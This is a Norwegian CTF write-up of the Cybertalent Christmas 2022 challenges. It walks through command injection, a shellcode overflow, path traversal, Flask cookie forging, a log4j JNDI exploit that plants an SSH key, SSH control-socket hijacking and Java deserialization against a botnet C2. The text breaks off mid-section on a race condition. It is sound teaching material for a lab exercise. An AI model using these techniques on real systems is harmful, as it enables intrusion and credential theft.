# Cybertalent CTF, julen 2022

E-tjenesten avholdt sin fjerde CTF i forbindelse med Cybertalent-programmet sitt. Årets utgave foregikk fortsatt via SSH, hvor hver deltaker får tilgang til et sett med private servere de kan herje med uten å ødelegge for resten.

Fokuset i år lå på oppdraget, som var betydelig lengre og vanskeligere enn foregående år, og utfordringene var desto færre. Det var også noen spor av oppgaver som ikke så ut til å ha blitt ferdig, men som vi kanskje får se i neste iterasjon.

- [Cybertalent CTF, julen 2022](#cybertalent-ctf--julen-2022)
  * [1. Grunnleggende](#1-grunnleggende)
    + [1.1 Scoreboard](#11-scoreboard)
    + [1.2 Setuid](#12-setuid)
    + [1.3 Injection](#13-injection)
    + [1.4 Overflow](#14-overflow)
    + [1.5 Heap](#15-heap)
    + [1.6 Nettverk](#16-nettverk)
    + [1.7 Reversing](#17-reversing)
    + [1.8 Path Traversal](#18-path-traversal)
    + [1.9 Path Traversal Bonus](#19-path-traversal-bonus)
  * [2. Oppdrag](#2-oppdrag)
    + [2.01_pcap](#201_pcap)
    + [2.02_anvilnotes](#202_anvilnotes)
    + [2.03_anvilnotes_admin](#203_anvilnotes_admin)
    + [2.04_anvilnotes_password](#204_anvilnotes_password)
    + [2.05_anvilnotes_source](#205_anvilnotes_source)
    + [2.06_pwr-ws-caf5db](#206_pwr-ws-caf5db)
    + [2.07_shady-aggregator](#207_shady-aggregator)
    + [2.08_client_list](#208_client_list)
    + [2.09_cloud-hq](#209_cloud-hq)
      - [Metode 1 - Deserialization](#metode-1---deserialization)
      - [Metode 2 - Race condition](#metode-2---race-condition)
      - [Metode 3 - DOS](#metode-3---dos)
    + [2.10_infrastruktur](#210_infrastruktur)
    + [2.11_aurum_shell](#211_aurum_shell)
    + [2.12_missile_targets](#212_missile_targets)
    + [2.13_findflag](#213_findflag)
    + [2.14_multiplier](#214_multiplier)
    + [2.15_firmware_staged](#215_firmware_staged)
    + [2.16_submarine_0.. 2.20_submarine_4](#216_submarine_0-220_submarine_4)
    + [2.21_mission_complete](#221_mission_complete)
  * [3.1 Utfordringer lett](#31-utfordringer-lett)
    + [3.1.1 Blekksprutspillet](#311-blekksprutspillet)
      - [Intro](#intro)
      - [Løsning](#l-sning)
    + [3.1.3 Kaffemaskin](#313-kaffemaskin)
    + [3.1.3 Sirclive](#313-sirclive)
      - [3.1.3_sirclive_x](#313_sirclive_x)
      - [3.1.3_sirclive_0](#313_sirclive_0)
      - [3.1.3_sirclive_1](#313_sirclive_1)
      - [3.1.3_sirclive_2](#313_sirclive_2)
      - [3.1.3_sirclive_3](#313_sirclive_3)
      - [3.1.3_sirclive_4](#313_sirclive_4)
  * [3.2 Utfordringer middels](#32-utfordringer-middels)
    + [3.2.1.x K13](#321x-k13)
      - [Øve - lett](#øve---lett)
      - [Fastulator](#fastulator)
      - [Hydropower](#hydropower)
      - [Beta 1 og 2](#beta-1-og-2)
    + [3.2.2 Python CMD handler](#322-python-cmd-handler)
      - [Intro](#intro-1)
      - [Løsning](#løsning-1)
  * [3.4 Utfordringer umulig](#34-utfordringer-umulig)
  * [4. Skjulte flagg](#4-skjulte-flagg)
    + [4.1 Askpass](#41-askpass)
    + [4.2 Corax /dev/shm](#42-corax--dev-shm)

## 1. Grunnleggende

Siden noen av oppgavene har byttet navn, og tidligere writeups har pekt på enda tidligere writeups, tar jeg en ny runde og samler alle løsningene for de grunnleggende oppgavene her.

### 1.1 Scoreboard

Denne forklarer bare hvordan man submitter flagg. Løsningen er å skrive det som står i filen `FLAGG`:
`scoreboard 17f8576529ce5213670bd22b1572b5bc`

### 1.2 Setuid

Intro til binaries med setuid. Løsningen er bare `./cat FLAGG` for å lese flagget som `basic2`-brukeren, siden `cat` er setuid og eies av brukeren `basic2`.

### 1.3 Injection

Som man kan se av koden i `md5sum.c` så erstattes `%s` med første argument fra kommandolinjen i `/usr/bin/md5sum %s`. Ved å bruke `;`eller `&&` kan vi skrive flere kommandoer. F.eks. 

`./md5sum "FLAGG ; cat FLAGG"` vil gi argumentet `FLAGG ; cat FLAGG` til programmet og den endelige kommandoen som kjøres blir
`/usr/bin/md5sum FLAGG; cat FLAGG` som først kaller md5sum på flagget, og så kaller `cat` etterpå for å skrive ut flagget.

### 1.4 Overflow

Denne oppgaven illustrerer et viktig konsept, nemlig buffer overflows, hvor noe brukerstyrt kan overfylle størrelsen på et buffer med fast størrelse, og dermed begynne å overskrive viktige ting som trengs for programflyten. Programmet gjør mesteparten av jobben for deg, og tillater deg å kjøre egendefinert shellcode hvis du klarer å overskrive riktig del av minnet med korrekt streng. Følgende kommandoer åpner et shell, og derfra er det bare å lese flagget.

```bash
$ export SHC=$(cat sample_shellcode)
$ ./overflow "AA$(echo $SHC)ABCDEFGHAAAAAAAABBBBBBBBCCCCCCCC000000"
```

### 1.5 Heap

Denne oppgaven ble ikke ferdig, men skulle vise hvordan man kan utnytte en overflow på heap i stedet for stacken. Vi får kanskje se denne neste gang.

### 1.6 Nettverk

```
Så langt har oppgavene dreid seg om å få tilgang til filer på en maskin hvor man allerede har tilgang. Dataangrep starter ofte ved at man må skaffe seg denne tilgangen ved å utnytte en *nettverkstjeneste* som er tilgjengelig på internett.
I denne mappen ligger en server som, etter å ha blitt startet, lytter på port `tcp/10015`. For å få tak i flagget trenger du ikke overflows som i forrige oppgave, men du må vise at du behersker programmeringsferdigheter som å håndtere flere samtidige tilkoblinger og konvertering av binære data.
```

Vedlagt ligger det et `server`-program med setuid til `basic5`, og filen `FLAGG` som eies av `basic5`. Målet er å starte opp `server`, og så koble til denne på port 10015 og følge instruksjonene som kommer. Oppgaven krever at man først kobler til en "hoved-socket" som får instruksjonene, så ytterligere 10 sockets til som vil få hvert sitt tall. Hovedsocketen skal sende summen av dette tallet, representert som hexadecimalt, til serveren. Deretter vil man begynne å få en melding tilbake, 1 byte om gangen, fordelt utover alle de 11 aktive socketene.

```bash
login@corax:~/1_grunnleggende/6_nettverk$ python3 ~/client.py
Dette er en grunnleggende introduksjon til nettverksprogrammering.
Når du har åpnet ti nye tilkoblinger til denne serveren vil du få videre instruksjoner på denne socketen.

Du vil nå få tilsendt et 32-bits heltall i `network byte order` i hver av de ti andre sesjonene.
Summer alle, og send resultatet tilbake på denne socketen.
Det er mange måter å konvertere data på. En av dem er `struct.unpack`.

160645735
263414164
92711090
9800581
232337240
39220454
243131576
11218140
160724093
99356108
1312559181
[b'N<\x10M']
Neste melding sendes fordelt over de ti sesjonene.
For å unngå å blokkere mens du leser kan du for eksempel bruke `select.select()` eller `socket.settimeout(0)`.

Husk at utf-8 kan ha multi-byte tegn 😊

╭────────────────────────────────────────╮
│ Gratulerer!                            │
│                                        │
│ Her er flagget:                        │
│                                        │
├────────────────────────────────────────┤
│    2ebcf72e92e1dbcdef61b4b4f4e8738b    │
╰────────────────────────────────────────╯
```

Den ferdige koden ligger in [client.py](client.py)

### 1.7 Reversing

Her har man atter en gang et flagg, eid av en annen bruker, og en setuid-binary. Reversing av denne, viser at de ønsker et passord som argument, og hvis dette er riktig, så kalles `setuid(flagg_eier)` etterfulgt `/bin/bash`, slik at vi kan lese flagget.
`check_password()`-funksjonen har flere trinn. Først sjekker den at input er 32 bytes lang. Deretter at den starter med `Reverse_engineering`. Etter dette, så sjekkes det at bokstaven på index 0x13 er `_`, samt at hvis man tolker index 0x13 til 0x17 som et tall, så tilsvarer det `0x5F72655F` som er tall-representasjonen av strengen `_re_` (må reversere strengen pga. endianness). Til slutt, så sjekkes det om strengen slutter med `morsomt__` (fra index 0x17 og ut). 
I IDA, så ser programmet ca. slik ut

![overflow](1_reversing.png)

Løsningen er derfor

```bash
$ ./check_password Reverse_engineering_er_morsomt__
```

### 1.8 Path Traversal

Mappen inneholder flere filer

```
login@corax:~/1_grunnleggende/8_path_traversal$ ls -la
total 23
drwxr-xr-x  3 basic8 login  1024 Dec 15 13:00 .
drwxr-xr-x 10 login  login  1024 Dec 15 13:00 ..
-r--------  1 basic8 login    40 Jan  4 20:08 BONUS_FLAGG
-r--------  1 basic8 login    40 Jan  4 20:08 FLAGG.txt
-rw-r--r--  1 basic8 login   814 Dec 15 13:00 LESMEG.md
drwxr-xr-x  2 basic8 login  1024 Dec 15 13:00 bok
-r-sr-xr-x  1 basic8 login 14368 Dec 15 13:00 les_bok
-rw-r--r--  1 basic8 login  1733 Dec 15 13:00 les_bok.c
```

Hvor `les_bok` har `setuid` satt, slik at den kjører som brukeren `basic8`. Kildekoden er forholdsvis enkel og grei, hvor `main()` itererer over argumentene til programmet, og kaller `show_file()` på de, gitt at de passerer sjekken i `filename_ok()`.
`filename_ok()` itererer over hele filnavnet, og sjekker om noen av bokstavene er en av ```&;$|<> ` ```, som er "farlige" tegn man skal unngå, hvis man kjører en string som en kommando. Disse kan nemlig bryte ut av strengen, eller kjøre sub-kommandoer i visse situasjoner (som jo var løsningen på Injection-oppgaven).

`show_file()` genererer kommandoen `less bok/<input_her>.txt`, setter `LESSSECURE=1` i env (gjør at man ikke kan bryte seg ut av less og kjøre kommandoer eller åpne nye filer), og så kalles libc sin `system()` på hele strengen. Feilen her, er at de også kjører `url_decode()` på kommandoen først. Sistnevnte utfører normal URL-dekoding på segmenter av formatet "%xx", slik at f.eks. blir "%41" til 'A'.
Løsningen er derfor ganske enkel. Siden programmet tar flere argumenter som input, men starter med "bok/" og slutter med ".txt", så er det fullt mulig å bruke "%20" til å injecte mellomrom mellom de forskjellige segmentene. Eksempelvis vil denne inputen lese både flagg og bonusflagg.
`./les_bok "../FLAGG.txt%20BONUS_FLAGG%20"`
Dette åpner 3 filer i less: `bok/../FLAGG.txt`, `BONUS_FLAGG` og `.txt`, hvor sistnevnte ikke finnes.

### 1.9 Path Traversal Bonus

Etter å ha kjørt kommandoen i 1.8, skriv `:n` inne i `less` for å hoppe til neste fil, som inneholder `BONUS_FLAGG`.

## 2. Oppdrag

Oppdraget har 3 filer:

- INTREP.txt

- LESMEG.md

- COMPROMISE_PWR-WS-CAF5DB.pcap

INTREP nevner at det har vært et angrep på et lokalt kraftverk, og at de har logget noe trafikk og samtidig koblet den kompromitterte serveren av fra kraftverket og tilgjengeliggjort den som hostname `PWR-WS-CAF5DB.PSU`. Vi får ikke noen brukernavn eller passord til denne. I tillegg nevnes `ANVILNOTES.CYBERTALENT.NO` som et domene aktørene har tatt i bruk før.

### 2.01_pcap

Første flagg ligger i første TCP stream i PCAPen. Legg også merke til at samme request sender en log4j-payload via User-Agent til serveren.

`X-Flag: caf5db3e4479b9c3dcb91e43ef9aa497`

### 2.02_anvilnotes

Det er åpent for å registrere seg på [Anvilnotes](https://anvilnotes.cybertalent.no/), og der kan man etterpå legge inn egne notes. Jeg mistenker først at dette er template injection, men jeg finner ingen feil jeg kan utnytte. Hver note får en tilsynelatende tilfeldig ID, og det er en "Save as PDF"-knapp på bunnen av hver note som kun administratorer får bruke - og dette er sjekket serverside.

Etter å ha registrert to brukere ser jeg derimot at det er mulig å aksessere notes fra andre brukere, og da forsøker jeg å gjette et par notes for admin. Finner en med id 1 på `/note/1` som eies av admin

```
FLAGG: 75a19...

Development status:
☑ Figure out a way to generate PDFs securely!
☑ Make IT department fix firewall rules for the internal API
☑ Randomize note ids to prevent enumeration
☐ VIM keybindings
☐ Secure flask token using military grade encryptions that can't be unsigned using open software.
☐ Enable PDF feature for all users
```

Når jeg leverer dette flagget får jeg et hint tilbake

> Admin sine notater, som han laget før id ble randomisert...
> Gir dette noen hint til hvordan du kan få mer tilgang?

### 2.03_anvilnotes_admin

Et stort hint i noten fra admin er punktet

`Secure flask token using military grade encryptions that can't be unsigned using open software.`

som bekrefter at de bruker Flask til å signere data med. Her kan vi bruke flask-unsign til å prøve en del standard-secrets

```
$ flask-unsign -u -c "eyJ1c2VybmFtZSI6InRlc3QifQ.Y5ukVw.XhK8QOgKp5qx_R0qfU0pYfFF9l0"
[*] Session decodes to: {'username': 'test'}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[*] Attempted (1920): -----BEGIN PRIVATE KEY-----ac
[+] Found secret key after 28544 attemptso4KIeAAde=6c
'This is an UNSECURE Secret. CHANGE THIS for production environments.'
```

Flask secret er altså en kjent streng. Nå kan vi signere en token som sier at vi er logget inn som admin

```
$ flask-unsign --sign --secret 'This is an UNSECURE Secret. CHANGE THIS for production environments.' --cookie "{'username': 'admin'}"
eyJ1c2VybmFtZSI6ImFkbWluIn0.Y5uk7w.5t0PmR7OTYk4lZ_01ekvJ2pzS4M
```

Øverst på Anvilnotes står flagget når man endrer cookie til denne

> # Welcome admin!
> 
> FLAGG: 76687...

og ved innlevering får vi et nytt hint

> Som admin har du kanskje tilgang til mer funksjonalitet?

### 2.04_anvilnotes_password

`admin`-brukeren har tilgang til å generere PDF-filer av et notat. Min første tanke er at PDF-generatoren har noen feil som lar meg inkludere lokale filer eller ressurser, men rask testing viser ingen tegn på at den parser teksten før den gjøres om til PDF. Om jeg i stedet endrer `id`-parameteren til f.eks. "x" så får jeg en interessant feilmelding fra `/genpdf`:

> http://localhost:9001/api/genpdf/x: Request failed

Så det kjører en lokal server for å generere PDFer, og `/genpdf` på anvilnotes går rett mot den. Path traversal ned til `/` via `id=../../` viser noe Swagger-output som beskriver funksjonaliteten i APIet

```json
{
  "definitions": {},
  "info": {
    "title": "Cool product name",
    "version": "0.0.0"
  },
  "paths": {
    "/api/decrypt": {
      "get": {
        "description": "",
        "parameters": [
          {
            "in": "GET(urlargs) or POST(body)",
            "name": "data",
            "required": true,
            "type": "hex string"
          }
        ],
        "produces": [
          "plaintext string"
        ],
        "responses": {},
        "summary": "Decrypt our data with secret internal key"
      },
      "post": {
        "description": "",
        "parameters": [
          {
            "in": "GET(urlargs) or POST(body)",
            "name": "data",
            "required": true,
            "type": "hex string"
          }
        ],
        "produces": [
          "plaintext string"
        ],
        "responses": {},
        "summary": "Decrypt our data with secret internal key"
      }
    },
    "/api/encrypt": {
      "post": {
        "description": "",
        "parameters": [
          {
            "in": "body",
            "name": "data",
            "required": true,
            "type": "string"
          }
        ],
        "produces": [
          "hex string"
        ],
        "responses": {},
        "summary": "Encrypts data with secret internal key"
      }
    },
    "/api/user/{user}": {
      "get": {
        "description": "",
        "parameters": [
          {
            "in": "path",
            "name": "<username>",
            "required": true,
            "type": "path"
          }
        ],
        "produces": [
          "application/json"
        ],
        "responses": {},
        "summary": "Get information from the database on a user. example: /api/user/bob"
      }
    },
    "/api/users": {
      "get": {
        "description": "",
        "produces": [
          "application/json"
        ],
        "responses": {},
        "summary": "List all users from database."
      }
    }
  },
  "swagger": "2.0"
}
```

Det virker vanskelig å benytte APIene som trenger POST, men det er enkelt å nå de som bare krever GET. Først ber jeg om `/api/users` for å hente ut alle brukerne. Blant en del generiske brukernavn finner jeg `admin` og `oper`.

```json
["admin","Benjamin","Brian","Cynthia","Frank","George","Henry","Jason","Julia","Karen","Laura","Marilyn","Mark","Mary","Olivia","oper","Richard","Russell","Samuel","Sharon","Stephen","Theresa"]
```

Via `/api/user/admin` og `/api/user/oper` får jeg ut det krypterte passordet til brukeren

```json
{"password":"825ba60fa38e96b2588ccfaa176dd882f5b4d43ae129a3ecdd036ad467d0eef53cde156733b95369adf94f299f7629c2481040e724dfd51e423e3e6a3311760af6a4748853faf4","username":"admin"}
```

og dette kan igjen mates inn i `/api/decrypt` for å finne at passordet til både admin og oper er `FLAGG: f8525d...`

> Hvis aktøren har benyttet denne tjenesten finner vi kanskje noen interessante notater.

### 2.05_anvilnotes_source

Ved å logge inn som `oper`, enten via flask-sign eller å bruke passordet, finner jeg to notater kalt "Backup of client source code" og "Backup of server source code". Begge notatene inneholder store mengder base64-data, men også et flagg på toppen

`2f1230...`

Ved innlevering får vi et hint

> Dette så interessant ut!
> En samarbeidende tjeneste i Pseudova vurderer at dette meget sannsynlig er kildekoden for skadevaren benyttet i angrepene mot kraftverket deres.

### 2.06_pwr-ws-caf5db

Det siste vi hørte om skadevaren, var at noen hadde lastet den opp på serveren som de nevnte i INTREP. Uten noen åpenbar vei videre, er det på tide å undersøke den. Vi ser av PCAP-filen at noen utnyttet en sårbarhet via en log4j-payload i User-Agent, og med den lastet de opp en SSH-nøkkel til brukeren. Det ser også ut som om de har brukt verktøyet `JNDIExploit`, som tilbyr et greit web-API for exploits og konverterer dette til en JNDI-payload automatisk. Jeg laster opp dette verktøyet til Corax, og serverer en nesten helt lik payload til `pwr-ws-caf5db`, bare med en SSH-key jeg har generert selv.

Etter få sekunder er den eksekvert, men jeg får ikke logget på med nøkkelen min uten å vite hvilken bruker den tilhører på remote. Jeg prøver brukernavn som admin og oper, før jeg forsøker `user` og det var korrekt. Vel inne på serveren finner jeg neste flagg på hjemmeområdet til brukeren

```bash
user@pwr-ws-caf5db ~> cat FLAGG
FLAGG: 495f4e1...
```

> Det later til at skadevaren fortsatt kjører. Finn flere spor etter aktøren, og søk å skaffe aksess videre inn i infrastrukturen deres.
> 
> Brukeren har også privatnøkkel for ssh-tilgang til sin egen maskin. Jeg legger en kopi i oppdragsmappen din for lettere tilgang senere.
> 
> Ny fil: /home/login/2_oppdrag/sshkey_pwr-ws-caf5db

Ved innlevering av flagget får jeg også en permanent SSH-key utdelt, så jeg slipper å måtte gjøre hele regla på nytt ved en reset. Lurt!

### 2.07_shady-aggregator

Prosesslisten på serveren viser at det skjer litt av hvert, men også at noen er logget inn fortsatt

```bash
user@pwr-ws-caf5db ~> ps auxfww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   2236   496 ?        Ss   19:08   0:00 /sbin/init
user          10  0.1  0.7 2542408 64640 ?       Sl   19:08   0:14 /usr/bin/java -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -jar /usr/share/java/api-server.jar
root          36  0.0  0.0  13348  3672 ?        Ss   19:08   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
root         202  0.0  0.1  14712  8792 ?        Ss   19:09   0:00  \_ sshd: user [priv]
user         208  0.0  0.0  15032  5796 ?        S    19:09   0:00  |   \_ sshd: user@pts/0
user         209  0.0  0.0 1116108 6992 pts/0    Ssl  19:09   0:00  |       \_ -fish
user         564  0.0  0.5 2330464 46904 pts/0   Sl+  19:09   0:10  |           \_ java -jar .client
root        4701  0.0  0.1  14716  9104 ?        Ss   22:59   0:00  \_ sshd: user [priv]
user        4707  0.0  0.0  15032  6036 ?        S    22:59   0:00      \_ sshd: user@pts/1
user        4708  0.0  0.0 829320  7696 pts/1    Ssl  22:59   0:00          \_ -fish
user        4883  0.0  0.0   6752  3052 pts/1    R+   23:03   0:00              \_ ps auxfww
user         461  0.0  0.0   9100  2320 ?        Ss   19:09   0:00 ssh: /home/user/.ssh/cp/archive@shady-aggregator_737236436b188023edcd4d77faeb428ba6e6f708 [mux]
```

ved nærmere undersøkelse av .ssh-mappen er det et par ting som stikker seg ut

```bash
user@pwr-ws-caf5db ~/.ssh> cat environment
SSH_ASKPASS=/usr/bin/ssh-askpass
DISPLAY=:0
user@pwr-ws-caf5db ~/.ssh> cat config
Host *
 UseRoaming no
 StrictHostKeyChecking accept-new
 ControlPersist 0
 ControlMaster autoask
 ControlPath ~/.ssh/cp/%r@%h_%C
 Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr
 KexAlgorithms curve25519-sha256,curve25519-sha256@libssh.org,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha256
 MACs hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,umac-128-etm@openssh.com
 HostKeyAlgorithms ssh-ed25519,ssh-ed25519-cert-v01@openssh.com,sk-ssh-ed25519@openssh.com,sk-ssh-ed25519-cert-v01@openssh.com,rsa-sha2-256,rsa-sha2-256-cert-v01@openssh.com,rsa-sha2-512,rsa-sha2-512-cert-v01@openssh.com
```

Det brukes en custom ssh-askpass (som inneholder et skjult flagg) og serveren tar i bruk control paths. Jeg kjenner ikke til konseptet veldig godt, men så vidt jeg skjønte er dette noe man gjerne tar i bruk om man vil unngå å re-autentisere seg via SSH om og om igjen i en periode. Jeg vet dette ikke er løsningen, men min vri på denne er å endre `config` til å ha `ControlMaster` satt til `auto` og så dreper jeg SSH-tilkoblingen til angriperen og venter på at de kobler til på nytt. Når de først kobler til igjen, kan jeg gjenbruke socketen deres til å logge rett inn uten å vite passordet

```bash
user@pwr-ws-caf5db ~/.ssh> ssh archive@shady-aggregator
$ ls -la
total 1364
drwx------ 1 archive archive     19 Dec 23 11:34 .
drwxr-xr-x 1 root    root        31 Dec 23 11:16 ..
-rw-r--r-- 1 archive archive    220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 archive archive   3526 Mar 27  2022 .bashrc
-rw-r--r-- 1 archive archive    807 Mar 27  2022 .profile
drwx------ 1 archive archive     29 Dec  2 14:20 .ssh
-r-------- 1 archive archive     40 Jan  4 20:08 FLAGG
-rw-r--r-- 1 archive archive  11258 Aug 15 14:00 client
-rw-r--r-- 1 archive archive    370 Aug 15 14:00 cmd_config_default_fast
-rw-r--r-- 1 archive archive    373 Aug 15 14:00 cmd_config_default_slow
-rw-r--r-- 1 archive archive    320 Aug 15 14:00 cmd_sysinfo
-rw-r--r-- 1 archive archive 900783 Aug 15 14:00 mimikatz_trunk.7z
-rwxr-xr-x 1 archive archive  43504 Aug 15 14:00 netcat
-rwxr-xr-x 1 archive archive 407480 Aug 15 14:00 socat
$ cat FLAGG
FLAGG: 6ac7b7bd4ae...
```

> Utmerket! Denne maskinen administrerer et botnett.
> 
> Det burde være mulig å hoppe videre til de andre enhetene som kontrolleres.

### 2.08_client_list

For de neste oppgavene må man ta et steg tilbake og undersøke det som er blitt funnet, og det er ganske mye. Klientprogrammet fra anvilnotes er kildekoden til `.client`, som kjører på den kompromitterte serveren. Dette er et Java-program som kobler til en C2-server og ber om kommandoer. Hver klient har en ID, og serveren kjører også på en hemmelig path på en webserver. Når en klient etterspør kommandoer, så får den servert serialiserte java-objekter fra en database på serversiden. Disse kan kjøre kommandoer, eller endre konfigurasjonsinnstillinger som URL å kontakte, eller frekvensen en server skal kontakte C2 med. Disse objekt-filene er signerte, og signaturene sjekkes både på server- og klient-siden før de går noe sted.

Ved å se på filene i `/tmp/.../` på `pwr-ws-caf5db` er det mulig å finne en backup av konfigurasjonen til C2-klienten. Den røper at remote URL er `http://shady-aggregator.utl/f52e6101`, og med den er det mulig å be om en liste over alle serverne.  Der er også neste flagg.

```bash
$ curl http://shady-aggregator.utl/f52e6101/list
ID               | NAME                             | LAST CHECKIN
-----------------+----------------------------------+--------------------
DEADBEEFDEADBEEF | test-3                           | 2022-12-16 01:39:56
42FD29AED93B779C | pwr-ws-caf5db                    | 2022-12-16 01:39:26
18F53CE5F533ACF7 | aurum                            | 2022-12-11 03:32:18
FLAGG            | 260c.......................9e021 | 2022-11-30 17:48:21
6ED230A80172B12E | pwr-ws-72fed1                    | 2022-11-16 11:00:32
F7D79C0F8995E423 | pwr-ws-64ca70                    | 2022-11-07 09:07:29
58A5FCF9FB1712B7 | pwr-ws-6d5602                    | 2022-06-30 01:47:58
93B58D54A5DB772A | pwr-ws-b5747c                    | 2022-06-11 17:25:14
CAFEBABECAFEBABE | test-2                           | 2022-02-23 08:06:40
46E894E2BEC4BD46 | pwr-ws-a8a1ce                    | 2022-02-06 22:53:02
14B6A84F08AC6887 | pwr-ws-e3fb32                    | 2022-01-27 17:24:04
DEADC0DEDEADC0DE | test-1                           | 2021-12-20 12:33:20
```

> En liste over alle de infiserte klientene deres?
> 
> Den test-instansen som fortsatt sjekker inn så spennende ut...

### 2.09_cloud-hq

Ut fra hintet i forrige oppgave, er neste mål serveren som heter "test-3". Den er fortsatt aktiv og kontakter C2 med jevne mellomrom. For å koble til denne må vi gjennom C2-serveren og lure den til å sende en payload som gir oss tilgang. Vi har et par pre-signerte payloads fra shady-aggregator-serveren, og en av de er `cmd_sysinfo` som kaller `hostname;id;ip a`. 

Sender denne til C2 med destinasjon DEADBEEFDEADBEEF
`curl "http://shady-aggregator.utl/f52e6101/DEADBEEFDEADBEEF/commands" -F "file=@cmd_sysinfo"`

etterfulgt av en /checkins for å se resultatet

```bash
curl "http://shady-aggregator.utl/f52e6101/DEADBEEFDEADBEEF/checkins"

+ Signature is valid.
+ Executing command:
- Recipient: ALL
- When: 1970-01-01T00:00:01Z
- Type: class commands.Execute
- Value: hostname;id;ip a
Executing command 'hostname;id;ip a':
cloud-hq-79
uid=1000(oper) gid=1000(oper) groups=1000(oper)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
6731: eth0@if6732: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1450 qdisc noqueue state UP group default
    link/ether 02:42:0a:00:18:e2 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.0.24.226/27 brd 10.0.24.255 scope global eth0
       valid_lft forever preferred_lft forever
```

Målet er altså serveren `cloud-hq-79` og vi vet brukernavnet som hører til. Det vil hjelpe oss med å skreddersy en exploit.

For å lure inn en egen exploit til `cloud-hq-79` er det 3 metoder som kan brukes. Jeg skal gå gjennom alle sammen, siden dette steget virket å være det de fleste satt fast på.

#### Metode 1 - Deserialization

Payloaden som sendes er et serialisert Java-objekt som inkluderer et signaturfelt. Første mottaker av denne er C2-serveren, som bruker Python og modulen `javaobj` til å parse objektet.

```python
def __init__(self, fd) -> None:
    obj: javaobj.JavaObject = javaobj.load(fd)
    self.type: str = "class " + obj.get_class().name
    self.recipient: str = obj.recipient
    self.run_after: int = obj.runAfter.second + obj.runAfter.nano / 1e9
    self.value: str = obj.value
    self.signature: bytes = bytes(
        map(lambda x: (x + 256) % 256, obj.signature._data)
    )

def __str__(self) -> str:
    when = datetime.utcfromtimestamp(self.run_after)
    return (
        f"- Recipient: {self.recipient}\n"
        + f"- When: {when:%Y-%m-%dT%H:%M:%SZ}\n"
        + f"- Type: {self.type}\n"
        + f"- Value: {self.value}\n"
    )
```

Signaturen er kun basert på feltene `run_after`, `recipient`, `value` og selve klassenavnet. Det betyr at hvis jeg legger til flere felter i det serialiserte objektet, så vil disse ignoreres fullstendig når signaturen sjekkes. (Signatursjekken er for øvrig solid nok, og det er ingen åpenbare svakheter med kryptografien på denne som kan utnyttes enkelt.)

I Java-koden gjøres noe tilsvarende

```java
// Execute if signature is correct
public void verify_and_execute(Command c) {
    if (!c.recipient.equals(cfg.id) && !c.recipient.equals("ALL")) {
        out.println("! I am not the recipient of this command.");
        out.printf("Me:  %s\nCmd: %s\n", cfg.id, c.recipient);

    } else if (c.verify()) {
        out.println("+ Signature is valid.");
        Instant now = Instant.now();

        if (c.runAfter.isBefore(now)) {
            out.println("+ Executing command:");
            c.display(out);
            c.execute(out, cfg);

        } else {
            out.println("+ Postponing command:");
            c.display(out);
            cfg.pendingCommands.add(c);
        }

    } else {
        out.println("! SIGNATURE IS INVALID?!");
    }
}
```

og execute-funksjonen kjøres kun hvis signaturen stemmer. Problemet til Java her, er at objektet allerede er deserialisert før denne signaturen sjekkes, og det er rimelig kjent at klassens readObject() kjøres når dette skjer.

Config-klassen implementerer også en slik funksjon, og denne har også funksjonalitet for å kjøre alle kommandoer som ligger i config-objektets kø. 

```java
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    id = ois.readUTF();
    sleepDuration = ois.readInt();
    serverURL = ois.readUTF();
    pendingCommands = new ArrayList<Command>();
    Instant now = Instant.now();
    int pendingCommandsSize = ois.readInt();
    for (int i = 0; i < pendingCommandsSize; i++) {
        Command c = (Command) ois.readObject();
        if (c.runAfter.isBefore(now))
            c.execute(System.out, this);
        else
            pendingCommands.add(c);
    }
}
```

Det vil si, at hvis jeg klarer å putte et config-objekt inni et ferdigsignert og serialisert Command-objekt, så vil Java automagisk initialisere dette objektet også, og det ender opp med å helt ukritisk kjøre mange usignerte kommandoer.

Å embedde et nøstet config-objekt inni et command-objekt er ikke ekstremt vanskelig. Man bare modifiserer klassene, og når det klages over mismatch mellom funksjonssignaturene til klassene, så bare endrer man de til det som forventes. Problemene oppstår når C2-serveren sin `javaobj`-modul skal lese det serialiserte objektet, for som siste kodesnutt viser så skrives det strenger og tall rett inn i objektet - og det skjønner ikke `javaobj`. Den prøver å parse det som et serialisert objekt, og tror det må være noe feil der, og kræsjer.

Løsningen var å ta et dypdykk ned i Java-serialisering og finne ut hvordan det fungerer. Etter mye om og men klarte jeg å lure inn en byte mellom signaturen og config-objektet som fikk javaobj til å la objektet være i fred. Herfra laget jeg en payload som dumpet en SSH-key i `/home/oper/.ssh/authorized_keys` og fikk endelig logget meg inn.

#### Metode 2 - Race condition

Det er en ganske enkel race-condition i C2-koden

```python
with tempfile.NamedTemporaryFile(dir=WORKSPACE) as f:
    command_file = f.name
    upload_file.save(command_file)

    try:
        obj = Command(f)
        obj.verify()

        logger.info(f"registering new command for client {client_id}")
        add_command_to_db(client_id, obj.run_after, command_file)
        return Response(f"OK\n", 200)
```

